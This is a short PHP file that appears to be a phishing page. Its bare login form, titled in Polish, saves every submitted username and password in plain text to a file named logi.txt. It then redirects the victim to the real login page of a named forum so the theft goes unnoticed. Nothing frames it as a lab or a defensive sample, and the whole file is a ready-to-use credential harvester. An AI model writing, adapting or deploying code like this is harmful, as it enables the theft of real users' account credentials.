<?php session_start(); /* Starts the session */
	
	/* Check Login form submitted */	
	if(isset($_POST['Submit'])){
		
		
		
		$Username = isset($_POST['Username']) ? $_POST['Username'] : '';
		$Password = isset($_POST['Password']) ? $_POST['Password'] : '';
		
		$tekst = "E-mail: $Username Hasło: $Password \r\n";
 
	$uchwyt = fopen("logi.txt", "a");
	fwrite($uchwyt, $tekst);
	fclose($uchwyt);
		
			header("location: http://katedra.nast.pl/forum/ucp.php?mode=login");
			
		
	}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Testowanie</title>

</head>
<body>
<div id="Frame0">
  <h1>Sprawdzanie</h1>

</div>
<br>
<form action="" method="post" name="Login_Form">
  <table width="400" border="0" align="center" cellpadding="5" cellspacing="1" class="Table">
    <?php if(isset($msg)){?>
    <tr>
      <td colspan="2" align="center" valign="top"><?php echo $msg;?></td>
    </tr>
    <?php } ?>
    <tr>
      <td colspan="2" align="left" valign="top"><h3>Login</h3></td>
    </tr>
    <tr>
      <td align="right" valign="top">Username</td>
      <td><input name="Username" type="text" class="Input"></td>
    </tr>
    <tr>
      <td align="right">Password</td>
      <td><input name="Password" type="password" class="Input"></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><input name="Submit" type="submit" value="Login" class="Button3"></td>
    </tr>
  </table>
</form>
</body>
</html>